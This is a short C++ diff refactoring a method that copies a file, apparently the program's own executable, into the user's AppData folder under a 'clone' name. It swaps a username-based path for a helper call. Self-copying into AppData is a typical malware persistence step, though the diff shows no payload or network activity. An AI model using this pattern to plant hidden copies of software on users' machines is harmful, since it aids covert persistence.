@@ -12,14 +12,8 @@ void CP::execute() {
 void CP::copy(){
 	char* filename = this->util.getFileName();
 	
-	string name;
-	TCHAR tcname[UNLEN + 1];
-	DWORD length = UNLEN + 1;
-	GetUserName(tcname, &length);
-	name = tcname;
-
-	this->path = this->base + name + this->appData + this->clone;
+	string path = this->util.getAppDataPath() + this->util.getClone();
 	
 	BOOL response = 0;
-	CopyFile(filename,this->path.c_str(),response);
+	CopyFile(filename,path.c_str(),response);
 }
